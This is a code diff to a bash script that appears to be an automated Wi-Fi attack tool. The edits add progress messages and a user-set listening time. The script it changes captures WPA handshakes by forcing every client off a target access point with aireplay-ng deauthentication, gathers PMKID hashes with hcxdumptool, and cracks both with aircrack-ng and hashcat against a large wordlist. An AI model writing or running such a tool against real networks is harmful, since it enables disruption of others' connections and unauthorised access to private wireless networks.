@@ -132,13 +132,17 @@ function select_target_network(){
 }
 
 function handshake(){
+    echo -e "${yellow}[*]${nc} Listening network traffic..."
     xterm -hold -e "airodump-ng -c $ap_channel -w "capture_${ap_bssid}" --bssid "${ap_bssid}" ${network_card}"&
     airodump_filter_xterm_pid=$!
 
-    sleep 5; xterm -hold -e "aireplay-ng -0 15 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
+    sleep 5; echo -e "${yellow}[*]${nc} Deauthenticating all clients..."
+    xterm -hold -e "aireplay-ng -0 15 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
     aireplay_xterm_pid=$!
 
     sleep 10; kill -9 $aireplay_xterm_pid; wait $aireplay_xterm_pid &>/dev/null
+
+    echo -e "${yellow}[*]${nc} Waiting handshake for 60 seconds..."
 
     sleep 60 # Listen for 60 seconds
 
@@ -158,11 +162,16 @@ function handshake(){
     fi
 
     xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt capture_${ap_bssid}-01.cap" &
+
+    mkdir -p handshakes
+    mv capture_* handshakes/
 }
 
 function pmkid(){
+    echo -ne "${yellow}[?]${nc} How many minutes do you want to listen? [1-60]: " && read minutes
+    minutes=$((minutes*60))
     echo -e "${yellow}[*]${nc} Start listening at $(date +%H:%M)...\n"
-    timeout 120 bash -c "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid"
+    timeout $minutes bash -c "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid"
     echo -e "\n${yellow}[*]${nc} Obtaining hashes..."
     hash_name="hashes_pmkid_$(date +%y_%m_%d_%H_%M).hc22000"
     hcxpcapngtool -o ${hash_name} capture_pmkid; rm -rf capture_pmkid
@@ -176,7 +185,7 @@ function pmkid(){
 
         echo -e "\n${yellow}[*]${nc} Initiating brute-force attack..."
         sleep 1
-        xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlist/kaonashiWPA100M.txt --force" &
+        xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlist/kaonashiWPA100M.txt" &
     else
         echo -e "\n${red}[!]${nc} The hashes are not captured :("
 
